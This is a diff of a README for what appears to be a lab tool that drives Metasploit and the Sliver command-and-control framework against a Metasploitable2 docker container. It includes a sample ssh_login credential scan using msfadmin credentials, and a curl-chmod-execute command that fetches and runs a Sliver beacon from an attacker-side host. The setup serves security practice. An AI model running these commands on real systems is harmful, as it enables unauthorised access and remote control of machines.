@@ -62,19 +62,18 @@ Type in parameters when needed
 
 Example of "run exploit/auxiliary" with scanner/ssh/ssh_login:
 ```bash
-[SERVER] Received: [+] Connected to Metasploit!
-Enter message (or 'quit' to exit): run auxiliary scanner/ssh/ssh_login
-[SERVER] Received: Please enter the USERNAME: 
-Enter message (or 'quit' to exit): msfadmin
-[SERVER] Received: Please enter the PASSWORD: 
-Enter message (or 'quit' to exit): msfadmin
-[SERVER] Received: Please enter the RHOSTS: 
-Enter message (or 'quit' to exit): 10.1.1.3
-[SERVER] Received: Please enter the THREADS: 
-Enter message (or 'quit' to exit): 5
-[SERVER] Received: Please enter the RPORT: 
-Enter message (or 'quit' to exit): 
-[SERVER] Received: {"job_id": 0, "uuid": "KFgCxXFIFQ3i5iIzQeE9FHBJ"}
+[SERVER] Received: Please enter USERNAME: 
+Please enter USERNAME:  msfadmin
+[SERVER] Received: Please enter PASSWORD: 
+Please enter PASSWORD:  msfadmin
+[SERVER] Received: Please enter RHOSTS: 
+Please enter RHOSTS:  10.1.1.3
+[SERVER] Received: Please enter THREADS (default: 1): 
+Please enter THREADS (default: 1):  5
+[SERVER] Received: Please enter RPORT (default: 22): 
+Please enter RPORT (default: 22):  22
+[SERVER] Received: {"job_id": 0, "uuid": "IKVE2Yb1HvmtjnUs1Vql2t4L"}
+{"job_id": 0, "uuid": "IKVE2Yb1HvmtjnUs1Vql2t4L"}
 ```
 
 Do NOT CLOSE Ender Server or Client while continuing
@@ -121,6 +120,8 @@ In fourth terminal (metasploitable2):
 docker exec -it metasploitable2 /bin/bash
 curl -O http://10.1.1.2:8080/testbeacon && chmod +x testbeacon && sudo service apache2 stop && ./testbeacon
 ```
+***CHANGE 3 instances of "testbeacon" if necessary in the previous command***
+
 Check the sliver-client terminal to see the beacon connection.
 
 #### Lastly, run main.py for simultaneous Metasploit and Sliver behavior
